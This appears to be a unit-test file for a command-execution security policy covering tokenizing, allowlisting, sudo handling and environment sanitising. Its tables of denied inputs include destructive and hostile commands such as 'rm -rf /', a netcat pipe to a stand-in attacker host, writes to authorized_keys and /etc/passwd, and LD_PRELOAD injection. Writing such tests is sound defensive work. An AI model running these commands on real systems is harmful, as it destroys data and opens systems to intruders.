/**
 * Unit tests - command policy (tokenizer, allowlist, sudo and env rules)
 */

import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  authorizeCommand,
  tokenizeCommand,
  getCommandPolicyConfig,
  resolveExecutable,
  sanitizeRequestEnv,
  isPrivilegedArgv,
  describeCommandInput,
  assertServiceName,
  assertContainerRef,
  assertPid,
  assertSignal,
  DEFAULT_COMMAND_ALLOWLIST,
  type CommandPolicyConfig,
} from '../../../src/services/commandPolicy.js';
import { CommandExecutionError } from '../../../src/domain/errors/index.js';

const BIN_NAMES = ['echo', 'ls', 'docker', 'systemctl', 'sudo', 'rm', 'bash', 'sh', 'env', 'df'];

let binDir: string;

function makeConfig(overrides: Partial<CommandPolicyConfig> = {}): CommandPolicyConfig {
  return {
    allowlist: new Set(['echo', 'ls', 'docker', 'systemctl', 'df']),
    searchPath: [binDir],
    allowSudo: true,
    ...overrides,
  };
}

function expectDenied(fn: () => unknown, status = 403): CommandExecutionError {
  try {
    fn();
  } catch (error) {
    expect(error).toBeInstanceOf(CommandExecutionError);
    expect((error as CommandExecutionError).statusCode).toBe(status);
    return error as CommandExecutionError;
  }
  throw new Error('expected the command to be denied');
}

beforeAll(() => {
  binDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cmd-policy-bin-'));
  for (const name of BIN_NAMES) {
    fs.writeFileSync(path.join(binDir, name), '#!/bin/sh\n', { mode: 0o755 });
  }
});

afterAll(() => {
  fs.rmSync(binDir, { recursive: true, force: true });
});

describe('tokenizeCommand', () => {
  it('splits on whitespace', () => {
    expect(tokenizeCommand('docker ps  -a\t--no-trunc')).toEqual(['docker', 'ps', '-a', '--no-trunc']);
  });

  it('keeps single-quoted text literal', () => {
    expect(tokenizeCommand("echo 'hello world' \"x\"")).toEqual(['echo', 'hello world', 'x']);
  });

  it('handles escapes inside double quotes and outside quotes', () => {
    expect(tokenizeCommand('echo "say \\"hi\\"" a\\ b')).toEqual(['echo', 'say "hi"', 'a b']);
  });

  it('supports empty quoted arguments and adjacent quoted segments', () => {
    expect(tokenizeCommand("echo '' a'b'\"c\"")).toEqual(['echo', '', 'abc']);
  });

  it('keeps docker format templates intact', () => {
    expect(tokenizeCommand('docker ps --format "{{json .}}"')).toEqual(['docker', 'ps', '--format', '{{json .}}']);
  });

  it('rejects unterminated quotes with 400', () => {
    expectDenied(() => tokenizeCommand("echo 'oops"), 400);
    expectDenied(() => tokenizeCommand('echo "oops'), 400);
  });

  it('rejects a trailing backslash with 400', () => {
    expectDenied(() => tokenizeCommand('echo \\'), 400);
  });

  it('rejects empty input with 400', () => {
    expectDenied(() => tokenizeCommand('   '), 400);
    expectDenied(() => tokenizeCommand(''), 400);
  });

  const metacharacterPayloads: Array<[string, string]> = [
    ['semicolon', 'echo hi; rm -rf /'],
    ['and-list', 'echo hi && rm -rf /'],
    ['or-list', 'echo hi || rm -rf /'],
    ['pipe', 'echo hi | nc attacker.example 4444'],
    ['background', 'echo hi & rm -rf /'],
    ['backticks', 'echo `id`'],
    ['command substitution', 'echo $(id)'],
    ['variable expansion', 'echo $HOME'],
    ['brace expansion of IFS', 'echo${IFS}hi'],
    ['newline', 'echo hi\nrm -rf /'],
    ['carriage return', 'echo hi\r\nid'],
    ['NUL byte', 'echo hi\0id'],
    ['output redirection', 'echo pwned > /etc/passwd'],
    ['append redirection', 'echo pwned >> /root/.ssh/authorized_keys'],
    ['input redirection', 'cat < /etc/shadow'],
    ['process substitution', 'diff <(ls) <(ls)'],
    ['quoted semicolon', 'echo "a;b"'],
    ['single-quoted pipe', "echo 'a|b'"],
  ];

  it.each(metacharacterPayloads)('rejects %s with 403', (_label, payload) => {
    const error = expectDenied(() => tokenizeCommand(payload));
    expect(error.message).toMatch(/metacharacters/);
  });
});

describe('authorizeCommand (string form)', () => {
  it('resolves an allowlisted bare name to an absolute path in the trusted dirs', () => {
    const result = authorizeCommand('docker ps -a', makeConfig());
    expect(result.file).toBe(path.join(binDir, 'docker'));
    expect(result.args).toEqual(['ps', '-a']);
    expect(result.executable).toBe('docker');
    expect(result.privileged).toBe(false);
  });

  it('accepts the absolute path an allowlisted name resolves to', () => {
    const absolute = path.join(binDir, 'echo');
    const result = authorizeCommand({ command: absolute, args: ['x'] }, makeConfig());
    expect(result.file).toBe(absolute);
  });

  const deniedPayloads: Array<[string, string]> = [
    ['non-allowlisted command', 'rm -rf /'],
    ['absolute path to non-allowlisted binary', '/bin/rm -rf /'],
    ['absolute path outside trusted dirs with allowlisted basename', '/tmp/docker ps'],
    ['relative path', './rm -rf /'],
    ['path traversal', '../../bin/rm -rf /'],
    ['path traversal inside absolute path', '/usr/bin/../bin/rm -rf /'],
    ['path traversal to allowlisted basename', '/usr/bin/../../tmp/echo hi'],
    ['env assignment prefix', 'FOO=1 rm -rf /'],
    ['LD_PRELOAD assignment', 'LD_PRELOAD=/tmp/evil.so ls'],
    ['shell via -c', 'bash -c id'],
    ['sh', 'sh -c id'],
    ['env wrapper', 'env rm -rf /'],
    ['sudo with non-allowlisted command', 'sudo rm -rf /'],
    ['sudo with user switch', 'sudo -u root ls'],
    ['sudo shell', 'sudo -s'],
    ['sudo with nothing', 'sudo'],
    ['sudo -n with nothing', 'sudo -n'],
  ];

  it.each(deniedPayloads)('denies %s with 403', (_label, payload) => {
    expectDenied(() => authorizeCommand(payload, makeConfig()));
  });

  it('denies allowlisted names that are not found in the trusted dirs', () => {
    const error = expectDenied(() => authorizeCommand('uptime', makeConfig({ allowlist: new Set(['uptime']) })));
    expect(error.message).toMatch(/trusted directories/);
  });

  it('denies everything with an empty allowlist', () => {
    expectDenied(() => authorizeCommand('echo hi', makeConfig({ allowlist: new Set() })));
  });

  it('runs sudo as "sudo -n <absolute path>" when allowed', () => {
    const result = authorizeCommand('sudo systemctl restart nginx', makeConfig());
    expect(result.file).toBe(path.join(binDir, 'sudo'));
    expect(result.args).toEqual(['-n', path.join(binDir, 'systemctl'), 'restart', 'nginx']);
    expect(result.privileged).toBe(true);
    expect(result.executable).toBe('systemctl');
  });

  it('accepts an explicit -n after sudo without duplicating it', () => {
    const result = authorizeCommand('sudo -n systemctl status nginx', makeConfig());
    expect(result.args).toEqual(['-n', path.join(binDir, 'systemctl'), 'status', 'nginx']);
  });

  it('denies sudo when ALLOW_SUDO_COMMANDS is false', () => {
    const error = expectDenied(() => authorizeCommand('sudo systemctl restart nginx', makeConfig({ allowSudo: false })));
    expect(error.message).toMatch(/ALLOW_SUDO_COMMANDS/);
  });

  it('never accepts sudo through the allowlist itself', () => {
    const config = getCommandPolicyConfig({ COMMAND_ALLOWLIST: 'sudo,echo', COMMAND_SEARCH_PATH: binDir });
    expect(config.allowlist.has('sudo')).toBe(false);
  });
});

describe('authorizeCommand (argv form)', () => {
  it('passes args verbatim, including characters a shell would interpret', () => {
    const result = authorizeCommand({ command: 'echo', args: ['a;b', '$(id)', '`x`', '|'] }, makeConfig());
    expect(result.args).toEqual(['a;b', '$(id)', '`x`', '|']);
  });

  it('denies a command containing spaces or metacharacters', () => {
    expectDenied(() => authorizeCommand({ command: 'echo hi', args: [] }, makeConfig()));
    expectDenied(() => authorizeCommand({ command: 'echo;id', args: [] }, makeConfig()));
  });

  it('denies non-allowlisted executables', () => {
    expectDenied(() => authorizeCommand({ command: 'rm', args: ['-rf', '/'] }, makeConfig()));
    expectDenied(() => authorizeCommand({ command: '/bin/rm', args: ['-rf', '/'] }, makeConfig()));
  });

  it('denies newlines and NUL bytes inside args', () => {
    expectDenied(() => authorizeCommand({ command: 'echo', args: ['a\nb'] }, makeConfig()));
    expectDenied(() => authorizeCommand({ command: 'echo', args: ['a\0b'] }, makeConfig()));
  });

  it('rejects non-string args and oversized argv with 400', () => {
    expectDenied(() => authorizeCommand({ command: 'echo', args: [1 as any] }, makeConfig()), 400);
    expectDenied(() => authorizeCommand({ command: 'echo', args: new Array(300).fill('x') }, makeConfig()), 400);
    expectDenied(() => authorizeCommand({ command: 'echo', args: ['x'.repeat(5000)] }, makeConfig()), 400);
  });

  it('rejects malformed input with 400', () => {
    expectDenied(() => authorizeCommand({ command: '  ', args: [] }, makeConfig()), 400);
    expectDenied(() => authorizeCommand(42 as any, makeConfig()), 400);
  });
});

describe('getCommandPolicyConfig', () => {
  it('uses the default allowlist when COMMAND_ALLOWLIST is unset', () => {
    const config = getCommandPolicyConfig({});
    expect([...config.allowlist].sort()).toEqual([...DEFAULT_COMMAND_ALLOWLIST].sort());
    expect(config.allowSudo).toBe(true);
    expect(config.searchPath).toContain('/usr/bin');
  });

  it('never includes shells or interpreters by default', () => {
    for (const name of ['sh', 'bash', 'python', 'python3', 'node', 'perl', 'env', 'xargs', 'find', 'awk', 'sudo', 'rm']) {
      expect(DEFAULT_COMMAND_ALLOWLIST).not.toContain(name);
    }
  });

  it('parses COMMAND_ALLOWLIST, ignoring unsafe entries', () => {
    const config = getCommandPolicyConfig({ COMMAND_ALLOWLIST: 'docker, df ../x ./rel a;b /opt/deploy.sh' });
    expect([...config.allowlist]).toEqual(['docker', 'df', '/opt/deploy.sh']);
  });

  it('treats an empty COMMAND_ALLOWLIST as deny-all', () => {
    expect(getCommandPolicyConfig({ COMMAND_ALLOWLIST: '' }).allowlist.size).toBe(0);
  });

  it('reads ALLOW_SUDO_COMMANDS and COMMAND_SEARCH_PATH', () => {
    const config = getCommandPolicyConfig({ ALLOW_SUDO_COMMANDS: 'false', COMMAND_SEARCH_PATH: `${binDir}${path.delimiter}relative` });
    expect(config.allowSudo).toBe(false);
    expect(config.searchPath).toEqual([binDir]);
  });

  it('allows absolute script paths listed verbatim', () => {
    const script = path.join(binDir, 'docker');
    const result = authorizeCommand({ command: script, args: [] }, makeConfig({ allowlist: new Set([script]) }));
    expect(result.file).toBe(script);
  });
});

describe('resolveExecutable', () => {
  it('only resolves inside the given directories', () => {
    expect(resolveExecutable('echo', [binDir])).toBe(path.join(binDir, 'echo'));
    expect(resolveExecutable('does-not-exist', [binDir])).toBeNull();
    expect(resolveExecutable('../echo', [binDir])).toBeNull();
  });
});

describe('sanitizeRequestEnv', () => {
  it('passes ordinary variables through', () => {
    expect(sanitizeRequestEnv({ APP_ENV: 'prod', count: '1' })).toEqual({ APP_ENV: 'prod', count: '1' });
    expect(sanitizeRequestEnv(undefined)).toBeUndefined();
  });

  it.each(['PATH', 'path', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'NODE_OPTIONS', 'BASH_ENV', 'IFS', 'PROMPT_COMMAND'])(
    'rejects protected variable %s',
    (key) => {
      expectDenied(() => sanitizeRequestEnv({ [key]: '/tmp/evil' }));
    }
  );

  it('rejects invalid names and multi-line values', () => {
    expectDenied(() => sanitizeRequestEnv({ 'BAD-NAME': 'x' }));
    expectDenied(() => sanitizeRequestEnv({ GOOD: 'a\nb' }));
    expectDenied(() => sanitizeRequestEnv({ GOOD: 1 as any }));
  });
});

describe('privilege classification', () => {
  it('flags sudo, mutating service verbs and destructive tools', () => {
    expect(isPrivilegedArgv(['sudo', 'ls'])).toBe(true);
    expect(isPrivilegedArgv(['/usr/bin/systemctl', 'restart', 'nginx'])).toBe(true);
    expect(isPrivilegedArgv(['systemctl', 'status', 'nginx'])).toBe(false);
    expect(isPrivilegedArgv(['service', 'nginx', 'status'])).toBe(false);
    expect(isPrivilegedArgv(['service', 'nginx', 'stop'])).toBe(true);
    expect(isPrivilegedArgv(['/bin/rm', '-rf', '/'])).toBe(true);
    expect(isPrivilegedArgv(['mkfs.ext4', '/dev/sda'])).toBe(true);
    expect(isPrivilegedArgv(['docker', 'ps'])).toBe(false);
    expect(isPrivilegedArgv([])).toBe(false);
  });
});

describe('internal argument validators', () => {
  it('validates service names', () => {
    expect(assertServiceName('nginx.service')).toBe('nginx.service');
    expect(assertServiceName('getty@tty1')).toBe('getty@tty1');
    expectDenied(() => assertServiceName('--no-block'), 400);
    expectDenied(() => assertServiceName('nginx; reboot'), 400);
  });

  it('validates container references', () => {
    expect(assertContainerRef('my_app-1')).toBe('my_app-1');
    expectDenied(() => assertContainerRef('-v'), 400);
    expectDenied(() => assertContainerRef('a b'), 400);
  });

  it('validates pids and signals', () => {
    expect(assertPid(42)).toBe(42);
    expect(assertPid('42')).toBe(42);
    expectDenied(() => assertPid(0), 400);
    expectDenied(() => assertPid('1;id'), 400);
    expect(assertSignal('TERM')).toBe('TERM');
    expect(assertSignal('9')).toBe('9');
    expectDenied(() => assertSignal('TERM 1'), 400);
    expectDenied(() => assertSignal('-9'), 400);
  });
});

describe('describeCommandInput', () => {
  it('renders string and argv inputs', () => {
    expect(describeCommandInput('docker ps')).toBe('docker ps');
    expect(describeCommandInput({ command: 'echo', args: ['a b', 'c'] })).toBe("echo 'a b' c");
  });
});
